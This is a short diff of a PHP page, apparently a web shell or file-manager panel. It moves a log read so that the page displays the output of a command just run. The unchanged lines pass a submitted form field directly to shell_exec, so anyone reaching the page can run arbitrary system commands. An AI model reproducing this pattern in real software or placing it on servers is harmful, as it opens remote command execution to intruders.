@@ -164,11 +164,11 @@ function formatSize( $bytes )
 </center>
 <?php
 if(isset($_POST['SendCMD'])) {
-    $log = file_get_contents('cmd.log');
     $logFile = "cmd.log";
     $fh = fopen($logFile, 'w');
     $stringData = shell_exec("{$_POST['cmd']}");
     fwrite($fh, $stringData);
+    $log = file_get_contents('cmd.log');
 }
 ?>
 
